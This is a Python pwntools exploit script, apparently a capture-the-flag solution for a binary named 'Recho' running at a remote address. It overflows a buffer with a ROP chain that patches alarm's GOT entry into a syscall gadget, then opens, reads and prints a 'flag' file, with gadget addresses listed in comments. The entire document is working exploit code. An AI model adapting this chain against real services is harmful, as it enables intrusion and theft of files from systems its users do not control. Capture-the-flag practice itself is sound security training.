from pwn import *


def rechosend(r: remote, lenth: int, data: bytes):
    r.sendline(str(lenth))
    r.sendline(data)


context.log_level = "debug"
# r = process("./Recho")
r = remote("111.200.241.244", 58265)
elf = ELF("./Recho")

pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rsi_r15 = 0x4008a1
pop_rdx = 0x4006fe
add_rdi = 0x40070d
flag_addr = elf.sym["flag"]
syscall = elf.plt["alarm"]

r.recvuntil("Welcome to Recho server!\n")
payload = cyclic(0x38)
payload += p64(pop_rdi) + p64(elf.got["alarm"])
payload += p64(pop_rax) + p64(0x5)
payload += p64(add_rdi)
# change alarm_got to syscall

payload += p64(pop_rax) + p64(2)  # sys_open
payload += p64(pop_rdi) + p64(flag_addr)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)  # O_RDONLY
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
# open("flag", 0, 0)

payload += p64(pop_rax) + p64(0)  # sys_read
payload += p64(pop_rdi) + p64(3)  # open's fd
payload += p64(pop_rsi_r15) + p64(elf.bss(0)) + p64(0)  # write on .bss
payload += p64(pop_rdx) + p64(40)
payload += p64(syscall)
# read(3, bss_addr, 40)

payload += p64(pop_rax) + p64(1)  # sys_write
payload += p64(pop_rdi) + p64(1)  # stdout's fd
payload += p64(pop_rsi_r15) + p64(elf.bss(0)) + p64(0)  # write on stdout
payload += p64(pop_rdx) + p64(40)
payload += p64(syscall)
# write(1, bss_addr, 40)

rechosend(r, 0x200, payload.ljust(0x200, b"\x00"))
r.shutdown("send")
r.interactive()

# 0x000000000040070d: add byte ptr [rdi], al; ret;
# 0x00000000004006fc: pop rax; ret;
# 0x00000000004008a3: pop rdi; ret;
# 0x00000000004006fe: pop rdx; ret;
# 0x00000000004008a1: pop rsi; pop r15; ret;